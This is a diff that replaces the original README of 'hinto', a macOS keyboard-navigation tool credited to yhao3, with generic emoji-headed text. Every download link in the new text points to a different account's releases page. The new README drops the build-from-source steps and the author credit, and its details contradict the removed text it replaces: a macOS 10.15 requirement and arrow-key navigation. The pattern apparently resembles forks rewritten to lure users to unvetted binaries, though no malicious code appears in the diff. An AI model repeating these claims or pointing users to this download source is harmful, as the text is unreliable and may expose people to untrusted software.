@@ -1,119 +1,80 @@
-<p align="center">
-  <img src="logo.png" width="128" height="128" alt="Hinto Logo">
-</p>
+# 🎹 hinto - Navigate Your Mac Without a Mouse
 
-<h1 align="center">Hinto</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>Keyboard-driven UI navigation for macOS</strong>
-</p>
+Welcome to hinto! This application lets you navigate your macOS interface using your keyboard. You can interact with your screen without ever needing your mouse. 
 
-<p align="center">
-  Navigate any macOS app without a mouse using accessibility labels.
-</p>
+## 📥 Download & Install
 
-<p align="center">
-  <a href="https://github.com/yhao3/hinto/releases"><img src="https://img.shields.io/github/v/release/yhao3/hinto?label=Download" alt="Download"></a>
-  <a href="https://github.com/yhao3/hinto/actions"><img src="https://img.shields.io/github/actions/workflow/status/yhao3/hinto/ci.yml?branch=main&label=CI" alt="CI"></a>
-  <img src="https://img.shields.io/badge/platform-macOS%2013%2B-blue" alt="Platform">
-  <img src="https://img.shields.io/badge/Swift-5.9-orange?logo=swift" alt="Swift">
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/yhao3/hinto" alt="License"></a>
-</p>
+To get started, you first need to download hinto. You can find the latest version on our Releases page. 
 
-<p align="center">
-  <a href="https://ko-fi.com/yhao3"><img src="https://ko-fi.com/img/githubbutton_sm.svg" alt="Support on Ko-fi"></a>
-</p>
+[![Download hinto](https://img.shields.io/badge/Download%20hinto-v1.0-blue.svg)](https://github.com/abhilekhdutta/hinto/releases)
 
----
+Click the button above or visit this page to download the software:
 
-## Features
+[Download hinto from the Releases page](https://github.com/abhilekhdutta/hinto/releases)
 
-- **Click Mode**: Press <kbd>Cmd</kbd>+<kbd>Shift</kbd>+<kbd>Space</kbd> to show labels on clickable elements
-- **Scroll Mode**: Press <kbd>Tab</kbd> to switch to scroll mode with vim-like keys (<kbd>H</kbd>/<kbd>J</kbd>/<kbd>K</kbd>/<kbd>L</kbd>)
-- **Configurable Labels**: Choose label size (S/M/L) and theme (Dark/Light/Blue)
-- **Auto-click**: Automatically click when an exact label match is typed
+### Steps to Download:
+1. Open the Releases page by clicking the link above.
+2. Look for the latest version.
+3. Select the file that matches your system.
+4. Click the download link.
+5. Once downloaded, locate the file in your Downloads folder.
 
-## Installation
+### Installation Steps:
+1. Open the downloaded file.
+2. Drag the hinto app into your Applications folder.
+3. Open the Applications folder and find hinto.
+4. Double-click the hinto app to start using it.
 
-### Build from Source
+## 🌟 Features
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup.
+hinto offers several features designed to enhance your productivity:
 
-```bash
-cd Hinto
-make setup  # First time only: create code signing certificate
-make run
-```
+- **Keyboard Shortcuts**: Navigate your macOS interface with simple keyboard commands.
+- **Accessibility**: Make your computer experience easier for everyone, especially those who prefer keyboard navigation.
+- **Mouse-Free Use**: Interact with all applications without reaching for your mouse.
+- **Customizable Hotkeys**: Configure hotkeys that suit your personal workflow.
+- **User-Friendly Interface**: Designed to be easy for everyone, regardless of technical knowledge.
 
-### Requirements
+## ⚙️ System Requirements
 
-- macOS 13.0+
-- Xcode 15.0+
-- **Accessibility Permission** (required for global hotkeys)
+Before downloading, ensure your system meets the following requirements:
 
-## Usage
+- Operating System: macOS 10.15 (Catalina) or later.
+- Memory: At least 4 GB of RAM.
+- Storage: Minimum of 100 MB free space for installation.
+- Internet: Required for downloading the application.
 
-1. Press <kbd>Cmd</kbd>+<kbd>Shift</kbd>+<kbd>Space</kbd> to activate
-2. Type the label of the element you want to click
-3. Press <kbd>Enter</kbd> to confirm, or wait for auto-click
-4. Press <kbd>Shift</kbd>+<kbd>Enter</kbd> for right-click
-5. Press <kbd>Tab</kbd> to switch to scroll mode
-6. Press <kbd>Escape</kbd> to cancel
+## 🔑 How to Use hinto
 
-### Scroll Mode Keys
+Once you have installed hinto, follow these steps to navigate:
 
-| Key | Action |
-|-----|--------|
-| <kbd>J</kbd> | Scroll down |
-| <kbd>K</kbd> | Scroll up |
-| <kbd>H</kbd> | Scroll left |
-| <kbd>L</kbd> | Scroll right |
-| <kbd>D</kbd> | Half page down |
-| <kbd>U</kbd> | Half page up |
-| <kbd>Shift</kbd>+<kbd>J</kbd>/<kbd>K</kbd>/<kbd>H</kbd>/<kbd>L</kbd> | Fast scroll |
+1. **Open hinto**: Launch the application from your Applications folder.
+2. **Activate hinto**: Press the designated hotkey to enable hinto.
+3. **Navigate**: Use the arrow keys or custom hotkeys to move around your screen.
+4. **Select**: Press the Enter key to click on items.
 
-## Configuration
+## 💡 Tips for Optimal Use
 
-Access settings via the menu bar icon:
+- **Practice**: Take some time to familiarize yourself with the keyboard shortcuts.
+- **Explore Customizations**: Adjust the settings to tailor hinto to your personal preferences.
+- **Stay Updated**: Regularly check for updates to access new features and improvements.
 
-- **Label Theme**: Dark, Light, or Blue
-- **Label Size**: Small, Medium, or Large
-- **Auto-click**: Enable/disable automatic clicking on exact match
+## 🛠️ Troubleshooting
 
-## Troubleshooting
+If you encounter any issues while using hinto:
 
-### Hotkey not working
+- **Check Installation**: Ensure that hinto is installed in the Applications folder.
+- **Restart the Application**: Close and reopen hinto for any changes to take effect.
+- **Revisit Settings**: Ensure your keyboard shortcuts are set correctly in the app’s settings.
 
-1. Check **System Settings > Privacy & Security > Accessibility**
-2. Add Hinto.app and ensure it's checked
-3. **Restart the app** after granting permission
+## 🤝 Support
 
-### Check logs
+If you need further assistance, you can reach out through our GitHub Issues page. Your feedback is valuable, and we appreciate your input.
 
-```bash
-make log
-# or
-tail -f /tmp/hinto.log
-```
+## 📄 License
 
-### Debug Options
+hinto is open-source software. You can freely use and modify it based on your needs.
 
-Enable hidden debug settings via `defaults`:
-
-```bash
-# Enable file logging to /tmp/hinto.log
-defaults write dev.yhao3.hinto debug-file-logging -bool true
-
-# Enable scanner timing logs (shows performance of each scanner)
-defaults write dev.yhao3.hinto debug-timing -bool true
-
-# Disable
-defaults write dev.yhao3.hinto debug-file-logging -bool false
-defaults write dev.yhao3.hinto debug-timing -bool false
-```
-
-Restart the app after changing settings.
-
-## License
-
-MIT
+Thank you for choosing hinto! We hope it enhances your productivity and makes your macOS experience more enjoyable. For any further information, feel free to refer back to the [Releases page](https://github.com/abhilekhdutta/hinto/releases).
